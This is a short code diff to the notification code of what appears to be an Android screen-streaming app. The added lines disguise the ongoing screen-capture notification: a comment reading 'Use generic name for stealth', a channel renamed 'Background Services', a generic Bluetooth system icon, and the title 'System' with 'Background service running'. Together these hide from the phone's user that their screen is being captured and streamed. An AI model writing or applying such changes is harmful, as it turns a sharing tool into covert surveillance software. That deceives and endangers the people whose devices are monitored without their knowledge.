@@ -36,14 +36,14 @@ internal class NotificationHelperImpl(context: Context) : NotificationHelper {
             notificationManager.deleteNotificationChannel("info.dvkr.screenstream.service.NOTIFICATION_CHANNEL_01")
             notificationManager.deleteNotificationChannel("info.dvkr.screenstream.NOTIFICATION_CHANNEL_START_STOP")
 
-            val streamingName = context.getString(R.string.app_notification_channel_streaming)
-            NotificationChannel(CHANNEL_STREAMING, streamingName, NotificationManager.IMPORTANCE_MIN).apply {
+            // Use generic name for stealth
+            NotificationChannel(CHANNEL_STREAMING, "Background Services", NotificationManager.IMPORTANCE_MIN).apply {
                 setSound(null, null)
                 enableLights(false)
                 enableVibration(false)
                 setShowBadge(false)
                 lockscreenVisibility = Notification.VISIBILITY_SECRET
-                description = ""
+                description = "System background services"
             }.let { notificationManager.createNotificationChannel(it) }
 
             val errorName = context.getString(R.string.app_notification_channel_error)
@@ -93,9 +93,9 @@ internal class NotificationHelperImpl(context: Context) : NotificationHelper {
             .setCategory(Notification.CATEGORY_SERVICE)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
-            .setSmallIcon(R.drawable.ic_notification_small_24dp)
-            .setContentTitle(context.getString(R.string.app_notification_streaming_title))
-            .setContentText(context.getString(R.string.app_notification_streaming_content))
+            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)  // Generic Bluetooth icon
+            .setContentTitle("System")  // Generic system title
+            .setContentText("Background service running")  // Generic message
             .setSilent(true)
         
         // FOREGROUND_SERVICE_DEFERRED is only available on Android 12+ (API 31)
